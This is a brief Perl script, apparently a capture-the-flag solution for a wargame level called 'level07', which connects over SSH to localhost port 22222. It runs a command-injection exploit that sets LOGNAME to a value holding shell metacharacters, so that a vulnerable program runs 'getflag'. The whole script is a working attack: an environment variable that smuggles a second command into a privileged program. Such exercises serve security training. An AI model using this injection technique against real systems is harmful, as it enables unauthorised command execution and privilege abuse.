#!/usr/bin/perl

$port = "22222";
$ip = "localhost";
$red = "\e[31m";
$green = "\e[32m";
$reset = "\e[0m";
$user = "level07";

$exploit = "LOGNAME=\\&\\&getflag && ./level07";
print $red, $exploit, $reset, "\n";
system("ssh -qp $port $user\@$ip '$exploit'");
